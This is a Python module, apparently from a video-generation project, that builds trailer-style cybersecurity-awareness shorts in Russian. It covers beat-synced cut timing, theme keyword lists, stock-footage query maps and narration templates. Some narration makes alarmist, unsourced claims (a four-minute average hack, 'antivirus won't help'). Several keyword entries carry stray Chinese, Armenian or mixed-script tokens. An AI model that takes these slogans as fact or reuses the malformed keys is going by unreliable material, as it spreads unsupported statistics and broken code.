"""Cinematic montage engine: вертикальные ролики 9:16 в стиле киношного трейлера.

Принцип: сначала ДРАМАТУРГИЯ И МОНТАЖ, потом кадры. Пайплайн:
    TOPIC -> SCRIPT -> SHOT LIST -> TIMELINE -> RENDER -> AUDIO MIX -> MP4

- plan_shots(): TOPIC -> SHOT LIST. Пробует LLM (bot/llm._complete, строгий
  JSON); при любой ошибке — встроенный шаблон template_shots(), который
  параметризуется ТЕМОЙ (не захардкоженный сценарий: тексты и визуальный
  ряд собираются под topic).
- Каждый shot: {id, act, dur, visual, camera, texts, trans_out, sfx, speed,
  accent, fx}. Рендер — покадровый PIL (никакого внешнего video API
  в проекте нет: весь видеоряд рисуется кодом, как и раньше).
- Переходы: hard_cut / whip / zoom / glitch (только цифровой сбой) /
  dip_to_black / speed_ramp. Подбираются по контексту акта, а не один
  на весь ролик.
- Типографика — часть монтажа: pop / tracking / reveal / rise.
  Крупные короткие фразы, не субтитры.
- Звук: beat-сетка (BPM из пресета), синтезированные SFX (numpy):
  impact / whoosh / riser / click / notify / bass / тишина. Плюс тихий
  битовый bed. Опционально голос поверх (voice_over).

Обратная совместимость: старый generate() из video_gen.py не тронут.
Новый режим включается через --style/--topic (см. video_gen.main).
"""

import glob
import json
import math
import os
import random
import re
import struct
import subprocess
import sys
import wave

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from PIL import Image, ImageDraw, ImageFont  # noqa: E402

import video_gen as vg  # noqa: E402  (переиспользуем шрифты/ffmpeg/mux)
from video_styles import get_style  # noqa: E402

try:
    import numpy as np  # noqa: E402
except Exception:
    np = None

W, H = 1080, 1920
FPS_CINE = 60              # 60 fps: плавный монтаж (эталон TikTok HEVC 60fps; 120 — опция через --fps)
SR = 24000  # частота дискретизации синтезированного звука

EXO2 = vg.EXO2
JURA = vg.JURA

_font = vg._font
_wrap = vg._wrap
_ts = vg._ts


# ---------- beat-сетка ----------

def beat_times(bpm, seconds):
    """Времена ударов сетки (сек), начиная с 0."""
    step = 60.0 / max(40, bpm)
    out, t = [], 0.0
    while t <= seconds + 1e-6:
        out.append(round(t, 3))
        t += step
    return out


def snap_cuts(durations, bpm, tol=0.30):
    """Подтягивает монтажные склейки к ближайшему биту (если сдвиг <= tol).

    Монотонность строго сохраняется (склейка не уезжает раньше предыдущей),
    сумма точно равна исходной (финальная перенормировка).
    """
    total = sum(durations)
    if total <= 0:
        return list(durations)
    cuts = []
    acc = 0.0
    for d in durations:
        acc += d
        cuts.append(acc)
    beats = beat_times(bpm, total)
    new_cuts = []
    prev = 0.0
    for c in cuts[:-1]:
        best = min(beats, key=lambda b: abs(b - c))
        if abs(best - c) > tol:
            best = c
        best = max(best, prev + 0.15)  # монотонность: только вперёд
        new_cuts.append(best)
        prev = best
    new_cuts.append(total)
    out = [new_cuts[0]]
    for i in range(1, len(new_cuts)):
        out.append(max(0.15, new_cuts[i] - new_cuts[i - 1]))
    s = sum(out) or 1.0
    return [d * total / s for d in out]


def warp_progress(p, speed):
    """Speed ramp: speed=(start,end). Возвращает искажённый прогресс 0..1.

    end>start — замедление в начале и ускорение в конце (и наоборот).
    """
    p = max(0.0, min(1.0, p))
    s0, s1 = speed or (1.0, 1.0)
    if s0 <= 0 or s1 <= 0:
        return p
    r = s1 / s0
    if abs(r - 1.0) < 1e-6:
        return p
    return 1.0 - (1.0 - p) ** r


def _ease_io(t):
    """Smoothstep: разгон-торможение внутри шота (M26-B, плавность).

    Линейный прогресс даёт резкий старт/стоп движения камеры и текста на
    каждой склейке — это и есть ощущение «рваности». Ease-in-out делает
    движение кинематографичным: ускорение из нуля, плавная остановка.
    """
    t = max(0.0, min(1.0, t))
    return t * t * (3 - 2 * t)


# ---------- сценарный план: LLM -> fallback-шаблон ----------

SHOT_SCHEMA_HINT = (
    'Верни ТОЛЬКО валидный JSON без пояснений: {"shots":[{'
    '"act":"hook|problem|escalation|peak|twist|accel|climax",'
    '"type":"cinematic|typography|graphic",'
    '"dur":1.5,"visual":"phone_dark|phone_message|phone_call|login_screen|'
    'qr_panel|qr_scan|token_panel|chain|attack_grid|server_rack|server_corridor|'
    'cables|switch_macro|keyboard|bokeh|eye|face_glow|person|consequence|'
    'flash|pause_black|question|final_q|final_brand",'
    '"camera":"push_in|push_out|drift|shake|static|snap|tilt|whip_pan",'
    '"texts":[{"lines":["КОРОТКО"],"mode":"pop|tracking|reveal|rise|whisper"}],'
    '"trans_out":"hard_cut|whip|zoom|glitch|dip|match|speed_ramp",'
    '"sfx":"impact|whoosh|riser|click|notify|bass|silence|none",'
    '"speed":[1.0,1.0],"accent":"accent|accent2"}]} '
    'Правила монтажа: чередуй type cinematic->typography->cinematic '
    '(текст ПОДЧЁРКИВАЕТ видео, а не заменяет); НИКАКИХ двух typography подряд; '
    'тексты — 1-3 КОРОТКИХ слова (не фразы на весь экран); '
    'длительности varied 0.3-2.8с (в climax 0.3-0.7с); '
    'match — только между визуально похожими кадрами; '
    'accent2 (красный) — ТОЛЬКО threat/compromised/warning/attack.'
)

# Чисто текстовые фоны: шот с texts на таком visual = ударная
# типографическая вставка (допустимая доля — не более ~30%).
PURE_TYPO_VISUALS = {"flash", "pause_black", "question", "final_q"}

_VALID = {
    "act": {"hook", "problem", "escalation", "peak", "twist", "accel", "climax"},
    "type": {"cinematic", "typography", "graphic"},
    "visual": {"phone_dark", "phone_message", "phone_call", "login_screen",
               "qr_panel", "qr_scan", "token_panel", "chain", "attack_grid",
               "server_rack", "server_corridor", "cables", "switch_macro",
               "keyboard", "bokeh", "eye", "face_glow", "person", "consequence",
               "flash", "pause_black", "question", "final_q", "final_brand",
               # M23: тематические художники
               "lock_shield", "wallet_crypto", "cloud_data", "mobile_notif",
               "email_phish", "code_terminal", "net_graph", "cam_surveillance",
               "firewall_wall", "ai_brain"},
    "camera": {"push_in", "push_out", "drift", "shake", "static",
               "snap", "tilt", "whip_pan"},
    "trans_out": {"hard_cut", "whip", "zoom", "glitch", "dip", "match",
                  "speed_ramp"},
    "sfx": {"impact", "whoosh", "riser", "click", "notify", "bass",
             "silence", "none"},
    "mode": {"pop", "tracking", "reveal", "rise", "whisper", "sub"},
}

# ---------- тематический анализ (M23: контекст-зависимый монтаж) ----------

_THEME_KW = {
    "social":   ("взлом", "аккаунт", "соцсет", "профил", "авториз", "пароль",
                  "соцсет", "мессенджер", "telegram", "whatsapp", "instagram",
                  "facebook", "tiktok", "поддельн", "фишинг", "phishing",
                  "social", "account", "profile", "login", "password", "message",
                  "chat", "identity", "catfish", "scam", "fake"),
    "infra":    ("сервер", "датацентр", "сеть", "инфраструктур", "облачн",
                  "хостинг", "dns", "router", "switch", "firewall", "ixaas",
                  "cloud", "datacenter", "network", "internet", "server",
                  "hosting", "data", "cdn", "endpoint", "proxy", "ssl", "tls"),
    "data":     ("данные", "утечк", "база", " персональ", "gdpr", "pii",
                  "credentials", "dump", "leak", "database", "exfiltr",
                  "конфиденци", "информац", "data", "breach", "exposure",
                  "privacy", "record", "sensitive", "classified"),
    "finance":  ("банк", "платёж", "транзакц", "крипто", "майнинг", "кошелёк",
                  "wallet", "crypto", "bitcoin", "blockchain", "financ",
                  "denьги", "средства", "перевод", "carding", "bank",
                  "payment", "transaction", "money", "theft", "fraud", "atm"),
    "malware":  ("вирус", "троян", "шифр", "ransom", "malware", "payload",
                  "exploit", "backdoor", "ботнет", "botnet", "maware",
                  "логику", "редирект", "инъекци", "sql", "xss", "rce",
                  "virus", "trojan", "worm", "spyware", "rootkit",
                  "encrypt", "decrypt", "infected", "compromised"),
    "privacy":  ("шпион", "наблюд", "трекинг", "geolocation", "прослуш",
                  "cam", "surveillance", "spyware", "stalkerware", "隐私",
                  "приват", "конфиденц", "face", "biometr", "камера",
                  "tracking", "monitor", "watch", "spy", "listen", "trace",
                  "location", "gps", "webcam", "microphone"),
}

_THEME_PAINTERS = {
    "social":   ["phone_dark", "phone_message", "phone_call", "person",
                  "face_glow", "eye", "login_screen", "flash"],
    "infra":    ["server_rack", "server_corridor", "switch_macro", "cables",
                  "net_graph", "cloud_data", "bokeh", "flash"],
    "data":     ["consequence", "cloud_data", "lock_shield", "firewall_wall",
                  "chain", "eye", "keyboard", "flash"],
    "finance":  ["wallet_crypto", "lock_shield", "keyboard", "phone_dark",
                  "qr_scan", "consequence", "eye", "flash"],
    "malware":  ["code_terminal", "keyboard", "chain", "attack_grid",
                  "server_corridor", "consequence", "flash", "eye"],
    "privacy":  ["cam_surveillance", "eye", "person", "phone_dark",
                  "face_glow", "mobile_notif", "lock_shield", "flash"],
}

_THEME_CAMERAS = {
    "social":   ["push_in", "drift", "shake", "snap"],
    "infra":    ["push_in", "push_out", "snap", "static"],
    "data":     ["push_in", "drift", "whip_pan", "shake"],
    "finance":  ["push_in", "snap", "drift", "tilt"],
    "malware":  ["shake", "snap", "push_in", "whip_pan"],
    "privacy":  ["push_in", "drift", "shake", "static"],
}

_THEME_TRANS = {
    "social":   ["whip", "hard_cut", "dip", "glitch"],
    "infra":    ["hard_cut", "match", "zoom", "whip"],
    "data":     ["hard_cut", "glitch", "whip", "dip"],
    "finance":  ["hard_cut", "whip", "zoom", "dip"],
    "malware":  ["glitch", "hard_cut", "whip", "speed_ramp"],
    "privacy":  ["dip", "hard_cut", "whip", "glitch"],
}

# M24: расширенные пулы художников по темам (12+ на тему вместо 8)
_THEME_PAINTERS_EXPANDED = {
    "social":   ["phone_dark", "phone_message", "phone_call", "person",
                  "face_glow", "eye", "login_screen", "mobile_notif",
                  "email_phish", "net_graph", "flash", "question"],
    "infra":    ["server_rack", "server_corridor", "switch_macro", "cables",
                  "net_graph", "cloud_data", "bokeh", "lock_shield",
                  "firewall_wall", "code_terminal", "flash", "question"],
    "data":     ["consequence", "cloud_data", "lock_shield", "firewall_wall",
                  "chain", "eye", "keyboard", "code_terminal",
                  "net_graph", "ai_brain", "flash", "question"],
    "finance":  ["wallet_crypto", "lock_shield", "keyboard", "phone_dark",
                  "qr_scan", "consequence", "eye", "chain",
                  "cloud_data", "net_graph", "flash", "question"],
    "malware":  ["code_terminal", "keyboard", "chain", "attack_grid",
                  "server_corridor", "consequence", "lock_shield", "firewall_wall",
                  "email_phish", "ai_brain", "flash", "question"],
    "privacy":  ["cam_surveillance", "eye", "person", "phone_dark",
                  "face_glow", "mobile_notif", "lock_shield", "phone_message",
                  "email_phish", "net_graph", "flash", "question"],
}

# M24: визуальные ключевые слова → stock-запросы (topic → Pexels/Pixabay query)
_TOPIC_STOCK_KW = {
    # RU keywords → EN stock queries
    "взлом":     ["hacker typing dark", "computer breach close up"],
    "аккаунт":   ["social media login screen", "phone notification alert"],
    "соцсет":    ["smartphone social apps", "social network abstract"],
    "мессенджер":["messaging app phone", "chat notification screen"],
    "фишинг":    ["phishing email fake", "suspicious link screen"],
    "пароль":    ["password typing keyboard", "login form close up"],
    "сервер":    ["server room racks", "data center corridor"],
    "сеть":      ["network cables close up", "router lights blinking"],
    "облачн":    ["cloud computing server", "cloud storage abstract"],
    "данные":    ["data stream abstract", "binary code screen"],
    "утечк":     ["data breach concept", "leaked documents"],
    "банк":      ["bank building night", "financial charts screen"],
    "крипто":    ["bitcoin coin close up", "cryptocurrency trading"],
    "кошелёк":   ["digital wallet phone", "crypto wallet interface"],
    "вирус":     ["malware virus concept", "computer virus alert"],
    "троян":     ["trojan horse concept", "infected computer screen"],
    "шифр":      ["encryption lock concept", "secure data abstract"],
    "шпион":     ["surveillance camera close up", "spy camera lens"],
    "наблюд":    ["security camera monitor", "CCTV footage screen"],
    "трекинг":   ["location tracking phone", "GPS map screen"],
    "камера":    ["webcam close up face", "security camera installation"],
    # EN keywords
    "hack":      ["hacker typing dark", "cyber attack concept"],
    "breach":    ["data breach concept", "security breach alert"],
    "phishing":  ["phishing email screen", "fake website close up"],
    "server":    ["server room dark", "data center racks"],
    "malware":   ["malware virus alert", "computer infected screen"],
    "crypto":    ["bitcoin coin close up", "cryptocurrency mining"],
    "bank":      ["bank building night", "financial security"],
    "surveillance": ["surveillance camera", "security monitor room"],
    "tracking":  ["GPS tracking phone", "location map screen"],
    "password":  ["password typing keyboard", "secure login screen"],
    "encrypt":   ["encryption concept lock", "secure data abstract"],
}

# S28: per-shot voice text → stock queries ( CONTENT-LEVEL matching ).
# Каждый шот получает запросы ПО ТОМУ, ЧТО ГОВОРИТ диктор, а не по общей теме.
_VOICE_STOCK_KW = {
    # вход / авторизация
    "сообщени":   ["smartphone notification dark", "message notification screen"],
    "звонок":     ["phone call screen dark", "incoming call mobile"],
    "номер":      ["phone dial pad close up", "unknown caller screen"],
    "незнаком":   ["unknown caller screen", "strange phone number"],
    "страница":   ["login web page screen", "website login form"],
    "вход":       ["login form close up", "sign in screen dark"],
    "нажати":     ["finger tapping screen", "touch screen click"],
    "клик":       ["mouse click close up", "cursor clicking button"],
    "письмо":     ["email inbox screen dark", "phishing email inbox"],
    "почт":       ["email notification screen", "inbox notification"],
    "ссылк":      ["link click screen", "suspicious url browser"],
    "адрес":      ["url bar browser close up", "web address typed"],
    "обновлен":   ["software update screen", "system update notification"],
    "файл":       ["file download screen", "document icon computer"],
    "документ":   ["document open screen", "file explorer window"],
    " QR ":       ["qr code scan phone", "qr code close up dark"],
    " QR-":       ["qr code scan phone", "qr code close up dark"],
    "wifi":       ["wifi connection screen", "wireless network phone"],
    "wi-fi":      ["wifi connection screen", "wireless network phone"],
    # атака / вторжение
    "атак":       ["cyber attack concept dark", "hacker hands keyboard"],
    "взлам":      ["hacker typing dark room", "computer breach"],
    "доступ":     ["unauthorized access screen", "hacker terminal login"],
    "токен":      ["api token screen", "session token concept"],
    "код":        ["code terminal screen dark", "programming code scrolling"],
    "парол":      ["password typing keyboard", "password field screen"],
    "сессия":     ["session expired screen", "user session concept"],
    "подмен":     ["fake website screen", "spoofed page browser"],
    " поддел":    ["forged document screen", "fake certificate close up"],
    " обман":     ["scam concept dark", "social engineering attack"],
    # инфраструктура
    "сервер":     ["server room dark racks", "data center corridor"],
    "дата-центр": ["data center interior", "server racks blinking"],
    "роутер":     ["router lights blinking", "network device close up"],
    "кабел":      ["network cables close up", "ethernet cable plug"],
    " DNS ":      ["dns server screen", "domain name system"],
    "сертифик":   ["ssl certificate screen", "security certificate browser"],
    "замок":      ["digital lock concept", "padlock security"],
    "провод":     ["cable management server", "network wiring"],
    # данные / утечки
    "данные":     ["data stream abstract", "binary code scrolling"],
    "утечк":      ["data breach concept", "leaked data screen"],
    "база":       ["database screen dark", "sql query terminal"],
    "терабайт":   ["data storage concept", "server hard drive"],
    "файл":       ["file encryption screen", "locked file icon"],
    # финансовые
    "денег":      ["money transfer screen", "digital payment concept"],
    "деньги":     ["cash and digital payment", "financial transaction"],
    "перевод":    ["bank transfer screen", "money sending app"],
    "банк":       ["banking app screen dark", "financial dashboard"],
    "крипто":     ["cryptocurrency trading screen", "bitcoin price chart"],
    "кошелёк":    ["crypto wallet interface", "digital wallet phone"],
    "оплат":      ["payment screen phone", "online payment form"],
    "растрат":    ["spending tracker screen", "financial loss concept"],
    # вредоносное ПО
    "вирус":      ["computer virus alert screen", "malware detection"],
    "троян":      ["trojan detected screen", "infected computer"],
    "шифр":       ["ransomware encryption screen", "files locked concept"],
    "зашифров":   ["encryption progress screen", "locked files ransomware"],
    "вредонос":   ["malware alert popup", "virus warning screen"],
    "заражен":    ["infected computer screen", "virus spreading network"],
    "сканер":     ["antivirus scanning screen", "system scan progress"],
    # слежка / приватность
    "шпион":      ["surveillance camera close up", "spy camera lens"],
    "наблюд":     ["security camera monitor wall", "cctv footage screen"],
    "трекинг":    ["location tracking phone map", "gps tracker screen"],
    "камера":     ["webcam close up face", "security camera install"],
    "прослуш":    ["wiretap concept", "microphone surveillance"],
    "запись":     ["screen recording concept", "keylogger capture"],
    "кейлоггер":  ["keylogger screen", "keystroke recording concept"],
    "лицо":       ["facial recognition screen", "face scan biometric"],
    "биометр":    ["fingerprint scan screen", "biometric authentication"],
    # общие слова (для шотов без специфичных ключевых)
    "ошибк":      ["error alert screen", "system error popup"],
    "угроз":      ["threat alert cybersecurity", "warning danger screen"],
    "риск":       ["risk assessment screen", "security risk concept"],
    "атака":      ["ddos attack concept", "network flood"],
    "защит":      ["firewall concept", "security shield"],
    "безопасн":   ["cybersecurity concept", "digital security lock"],
    "хакер":      ["hacker silhouette dark", "hacker hands keyboard"],
    "злоумышлен": ["criminal hacker dark", "cybercriminal concept"],
    "ловушк":     ["trap concept dark", "honey pot cyber"],
    "кража":      ["data theft concept", "stealing data screen"],
    "ուտեստ":     ["test concept", "system test"],
    # S29: expanded content-level matching for common narration phrases
    "KeySpec":     ["password typing keyboard", "password field screen"],
    "загрузк":     ["file download screen", "downloading progress bar"],
    "установк":    ["software installation screen", "setup wizard"],
    "обновлени":   ["software update screen", "system update notification"],
    "приложен":    ["mobile app screen dark", "smartphone apps grid"],
    "мессенджер":  ["messaging app phone", "chat screen dark"],
    "телеграм":    ["telegram app phone", "messaging notification dark"],
    "wechat":      ["wechat app screen", "messaging app dark"],
    "whatsapp":    ["whatsapp chat screen", "message notification dark"],
    "электрон":    ["email inbox dark", "electronic message screen"],
    "пользовател":["user profile screen", "account settings dark"],
    "регистрац":   ["registration form screen", "signup page dark"],
    "подозрит":    ["suspicious activity screen", "warning alert dark"],
    "подделк":     ["fake website screen", "forged page browser"],
    "фишингов":    ["phishing email fake", "phishing website screen"],
    "кража":       ["data theft concept", "stealing data screen"],
    "крад":        ["data theft concept", "hacker stealing data"],
    "серьёзн":     ["serious threat concept", "critical alert screen"],
    "последстви":  ["consequence concept dark", "damage assessment"],
    "уйти":        ["logout screen", "sign out button"],
    "отключ":      ["disconnected screen", "network offline"],
    "блокировк":   ["account locked screen", "blocked access"],
    "восстановл":  ["account recovery screen", "password reset"],
    "нарушени":    ["security breach screen", "intrusion detected"],
    "незаконн":    ["unauthorized access dark", "illegal access alert"],
    "целев":       ["targeted attack concept", "spear phishing"],
    "массов":      ["mass attack concept", "bulk data breach"],
    "автоматическ":["automation screen", "bot concept dark"],
    " оператор":   ["call center dark", "operator headset"],
    "специалист":  ["IT specialist screen", "cybersecurity professional"],
    "эксперт":     ["security expert screen", "analyst dashboard"],
    "исследоват":  ["security research screen", "cyber analyst"],
    "анти-virus":  ["antivirus scan screen", "malware detection"],
    "антивирус":   ["antivirus scan screen", "security software"],
    "брандмауэр":  ["firewall concept", "network security barrier"],
    "воспроизв":   ["media player screen", "video playback"],
    "запуск":      ["launch screen dark", "startup sequence"],
    "трафик":      ["network traffic screen", "data flow visualization"],
    "интерфейс":   ["software interface dark", "UI dashboard"],
    "скриншот":    ["screenshot concept", "screen capture"],
    "контроль":    ["monitoring dashboard dark", "control panel"],
    "мониторинг":  ["security monitoring screen", "network monitor"],
    "лог":         ["system log screen", "log entries terminal"],
    "журнал":      ["audit log screen", "event log terminal"],
    "архив":       ["archive files screen", "compressed folder"],
    "бэкап":       ["backup progress screen", "data backup concept"],
    "копия":       ["file copy screen", "backup creation"],
    "восстанови":  ["data recovery screen", "restore files"],
    "удалени":     ["file deletion screen", "delete confirmation"],
    "форматир":    ["format disk screen", "disk formatting"],
    " шифров":     ["encryption screen dark", "files being encrypted"],
    "дешифр":      ["decryption screen", "unlocking files"],
    "сертификат":  ["SSL certificate screen", "security certificate"],
    "подпис":      ["digital signature screen", "code signing"],
    "аутентифик":  ["authentication screen", "2FA verification"],
    "двуфакторн":  ["two-factor auth screen", "2FA code entry"],
    "доступ":      ["access granted screen", "permission granted"],
    "ограничен":   ["access restricted screen", "permission denied"],
    "разрешени":   ["permission screen", "authorization granted"],
    "уровень":     ["security level screen", "threat level"],
    "статус":      ["status dashboard", "system status"],
    "уведомлен":   ["notification screen dark", "alert popup"],
    "предупрежд":  ["warning screen", "alert notification"],
    "ошибк":       ["error alert screen", "system error popup"],
    "критическ":   ["critical error screen", "fatal error"],
    "аварийн":     ["emergency screen", "system crash"],
    "сбой":        ["system failure screen", "crash report"],
    "зависан":     ["frozen screen", "application hang"],
    "перегрузк":   ["overloaded server", "system overload"],
}


def generate_stock_queries(topic, themes, max_q=6):
    """M24: Генерирует stock-запросы ИЗ темы (а не из фиксированного пресета).

    Извлекает ключевые слова из topic → ищет совпадения в _TOPIC_STOCK_KW.
    Если тема не распознана — берём通用овые запросы из тематических пулов.
    Возвращает список EN-запросов для Pexels/Pixabay.
    """
    import re as _re
    topic_lower = (topic or "").lower()
    # извлекаем слова из темы
    words = set(_re.findall(r"[a-zA-Zа-яА-ЯёЁ]{3,}", topic_lower))
    found = []
    for kw, queries in _TOPIC_STOCK_KW.items():
        if kw in topic_lower or any(w.startswith(kw[:4]) for w in words if len(kw) >= 4):
            found.extend(queries)
    # дедуп, preserving order
    seen = set()
    unique = []
    for q in found:
        if q not in seen:
            seen.add(q)
            unique.append(q)
    # если нашли мало — добавляем generic по теме
    theme_generic = {
        "social":    ["smartphone notification dark", "social media screen"],
        "infra":     ["server room dark", "network cables close up"],
        "data":      ["data stream abstract", "binary code screen"],
        "finance":   ["financial charts screen", "bank security camera"],
        "malware":   ["computer virus alert", "hacker code screen"],
        "privacy":   ["surveillance camera close up", "privacy lock concept"],
    }
    for t in (themes or []):
        for q in theme_generic.get(t, []):
            if q not in seen:
                seen.add(q)
                unique.append(q)
    # fallback generic
    if not unique:
        unique = ["cybersecurity concept dark", "technology abstract",
                   "digital lock security", "data center dark"]
    return unique[:max_q]


# Озвучка по темам (M23): плоские dict с {TOPIC} placeholder.
# Подстановка — .replace('{TOPIC}', short) при вызове template_shots (мгновенно).
_NARR_GENERIC = {
    "hook": [
        ("Вас уже могут взламывать. {TOPIC}. Прямо сейчас.", "ВЗЛОМ УЖЕ ИДЁТ"),
        ("Пока вы это читаете, {TOPIC} под угрозой.", "УГРОЗА УЖЕ ЗДЕСЬ"),
        ("Каждый день {TOPIC} теряет тысячи пользователей.", "ТЫСЯЧИ ПОТЕРЬ"),
        ("Кибератаки стали нормой. {TOPIC} — цель.", "НОРМАЛЬНАЯ ЦЕЛЬ"),
        ("Ничего не заметили? {TOPIC} уже под контролем.", "УЖЕ ПОД КОНТРОЛЕМ"),
        ("Среднее время взлома — четыре минуты. {TOPIC}.", "4 МИНУТЫ ДО ВЗЛОМА"),
        ("{TOPIC}. Это не теория — это происходит сейчас.", "СЕЙЧАС"),
        ("Забудьте про антивирус. {TOPIC} уже в опасности.", "АНТИВИРУС НЕ ПОМОЖЕТ"),
        ("Новые угрозы. Новые жертвы. {TOPIC} — следующий?", "СЛЕДУЮЩАЯ ЦЕЛЬ"),
        ("Каждый день — новая атака. {TOPIC} не исключение.", "НЕ ИСКЛЮЧЕНИЕ"),
    ],
    "problem": [
        ("Вам приходит самое обычное сообщение.", "Обычное сообщение"),
        ("Звонок с незнакомого номера.", "Незнакомый номер"),
        ("Знакомая страница входа. Почти.", "Почти знакомый вход"),
        ("Одно нажатие — и вы внутри ловушки.", "Одно нажатие"),
        ("Письмо от банка. Почти настоящее.", "Почти настоящее"),
        ("Ссылка в мессенджере от друга.", "Ссылка от друга"),
        ("Обновление системы. Срочное. Настоящее?", "Срочное обновление"),
        ("QR-код на парковке. Бесплатный Wi-Fi.", "Бесплатный Wi-Fi"),
        ("Файл в письме. Important.docx.exe.", "Поддельный файл"),
        ("Сообщение в Telegram: «Это ты?»", "Это ты?"),
        ("Реклама в соцсети. Слишком выгодное предложение.", "Выгодное предложение"),
        ("Знакомый логотип. Почти правильный URL.", "Почти правильный URL"),
    ],
    "escalation": [
        ("Ссылка. Клик. Вход. Токен.", "Цепочка атаки"),
        ("Так угоняют доступ за пару минут.", "Доступ за минуты"),
        ("Серверы уже видят чужого.", "Чужой в сети"),
        ("Пароль утек. Сессия скомпрометирована.", "Пароль утек"),
        ("Двухфакторка? Обходим. Через тебя же.", "Обходим 2FA"),
        ("Токен сессии — и админ доступ ваш.", "Токен = доступ"),
        ("Cookies подменены. Браузер доверяет.", "Браузер доверяет"),
        ("DNS-спуфинг. Вы на чужом сервере.", "Чужой сервер"),
        ("Сертификат поддельный. Замок не спасает.", "Поддельный замок"),
        ("Через SMS-пароль. Прямиком к аккаунту.", "Через SMS"),
    ],
    "peak": [
        ("Фишинг. Подмена. Украденная сессия.", "Сессия украдена"),
        ("Звонки, коды, поддельные экраны.", "Атака со всех сторон"),
        ("Устройство уже скомпрометировано.", "Устройство скомпрометировано"),
        ("Вся сеть видит ваш пароль.", "Пароль на виду"),
        ("Данные утекают. Терабайтами.", "Терабайты утечек"),
        ("Крипто-майнер в фоне. Сервер горит.", "Сервер горит"),
        ("Бэкдор открыт. И закрыть его нечем.", "Бэкдор открыт"),
        ("Рейнсомшифр. Ваши файлы — заложники.", "Файлы — заложники"),
        ("Компания молчит. Утечка — миллионы.", "Молчание = миллионы"),
        ("Права root у злоумышленника.", "Root доступ"),
    ],
    "twist": [
        ("Но самое страшное — дальше.", "Самое страшное"),
        ("Тихо. Слушайте.", "Пауза"),
        ("Дверь злоумышленникам открываете вы сами.", "Вы сами"),
        ("Замок есть. Но ключ — у них.", "Ключ у них"),
        ("Вы думаете, это не про вас?", "Не про вас?"),
        ("Спойлер: это про всех.", "Про всех"),
        ("Каждый считает, что его не тронут.", "Не тронут?"),
        ("Пока не тронут. Пока.", "Пока не тронут"),
    ],
    "accel": [
        ("Одна ошибка превращается в один аккаунт.", "Одна ошибка"),
        ("Одно устройство — и вся система.", "Вся система"),
        ("Секунда — и пароль ваш.", "Секунда"),
        ("Один клик — и доступ потерян.", "Один клик"),
        ("Три секунды. Всё. Конец.", "Три секунды"),
        ("Ноль уведомлений. Ноль шансов.", "Ноль шансов"),
        ("Тихо. Без следов. Без возможности.", "Без следов"),
        ("Файлы. Деньги. Репутация. Всё сразу.", "Всё сразу"),
    ],
    "climax": [
        ("Темп растёт. Система тает на глазах.", "Система тает"),
        ("Так кто кого защищает в истории: {TOPIC}?", "Кто кого защищает"),
        ("Вы систему. Или система — вас?", "Вы или вас"),
        ("ТрастНод. Кибербезопасность простыми словами.", "ТрастНод"),
        ("Защита начинается с вас.", "Начните сейчас"),
        ("Не ждите взлома. Действуйте.", "Действуйте"),
        ("Кибербезопасность — это привычка.", "Привычка безопасности"),
        ("Один шаг назад — и вы впереди.", "Один шаг"),
        ("Ваша безопасность — ваш выбор.", "Ваш выбор"),
        ("ТрастНод. Мы объясняем просто.", "ТрастНод"),
    ],
}

# Тематические NARR — только то, что отличается от generic.
# Социальная инженерия: реплики про обман, доверие, людей.
_NARR_SOCIAL = {
    "hook": [
        ("{TOPIC}. Вас обманывают. Каждый день.", "ОБМАН КАЖДЫЙ ДЕНЬ"),
        ("Злоумышленники знают ваше имя. {TOPIC}.", "ЗНАЮТ ВАШЕ ИМЯ"),
        ("{TOPIC} — идеальная цель для соцсетного инженера.", "ЦЕЛЬ ИНЖЕНЕРА"),
        ("Доверие — ваша главная уязвимость. {TOPIC}.", "ДОВЕРИЕ = УЯЗВИМОСТЬ"),
        ("Кто-то уже читает ваши сообщения. {TOPIC}.", "ЧИТАЮТ ВАШИ СООБЩЕНИЯ"),
        ("{TOPIC}. Поддельные аккаунты — новый стандарт.", "ПОДДЕЛЬНЫЕ АККАУНТЫ"),
    ],
    "problem": [
        ("Сообщение от «друга». Почти настоящее.", "От «друга»"),
        ("Звонок из банка. Голос настоящий. Номер — нет.", "Настоящий голос"),
        ("Просьба срочно перевести деньги. «Срочно!».", "Срочный перевод"),
        ("Фото в мессенджере. От знакомого. Почти.", "От знакомого"),
        ("Письмо: «Ваш аккаунт заблокирован».", "Аккаунт заблокирован"),
        ("Профиль в соцсети. Все фото. Все друзья. Подделка.", "Всё как надо"),
    ],
}

# Инфраструктура: серверы, сети, облака.
_NARR_INFRA = {
    "hook": [
        ("{TOPIC}. Серверы горят. Данные утекают.", "СЕРВЕРЫ ГОРЯТ"),
        ("Один сервер — и тысячи компаний. {TOPIC}.", "ТЫСЯЧИ КОМПАНИЙ"),
        ("{TOPIC} — точка отказа для всей инфраструктуры.", "ТОЧКА ОТКАЗА"),
        ("Облачный провайдер под ударом. {TOPIC}.", "ОБЛАКО ПОД УДАРОМ"),
        ("Инфраструктура рушится. {TOPIC} — эпицентр.", "ЭПИЦЕНТР"),
        ("{TOPIC}. Если сервер падает — всё падает.", "ВСЁ ПАДАЕТ"),
    ],
    "problem": [
        ("Обновление прошивки. Поддельное.", "Поддельная прошивка"),
        ("Кабель в дата-центре. Обычный. Почти.", "Почти обычный"),
        ("DNS-запрос. На чужой сервер.", "На чужой сервер"),
        ("Сертификат валидный. Владелец — нет.", "Валидный сертификат"),
        ("Роутер перезагрузился. Сам.", "Сам перезагрузился"),
        ("Логин в панель админа. Настоящий? Нет.", "Настоящий логин"),
    ],
}

# Финансы: деньги, крипто, транзакции.
_NARR_FINANCE = {
    "hook": [
        ("{TOPIC}. Деньги утекают. Тихо.", "ДЕНЬГИ УТЕКАЮТ"),
        ("Крипто-кошелёк пуст. {TOPIC}.", "КОШЕЛЁК ПУСТ"),
        ("{TOPIC} — финансовая катастрофа за минуты.", "ФИНАНСОВАЯ КАТАСТРОФА"),
        ("Миллионы исчезли. {TOPIC}. Молча.", "МИЛЛИОНЫ ИСЧЕЗЛИ"),
        ("Банковский аккаунт взломан. {TOPIC}.", "ВЗЛОМ БАНКА"),
        ("{TOPIC}. Финансовая безопасность — иллюзия.", "ИЛЛЮЗИЯ БЕЗОПАСНОСТИ"),
    ],
    "problem": [
        ("Письмо из банка. Почти настоящее.", "Почти из банка"),
        ("QR-код для оплаты. Поддельный.", "Поддельный QR"),
        ("Ссылка на «личный кабинет». Чужая.", "Чужая ссылка"),
        ("Звонок: «Ваш перевод задержан».", "Задержан перевод"),
        ("Токен для крипто-кошелька. Украден.", "Украден токен"),
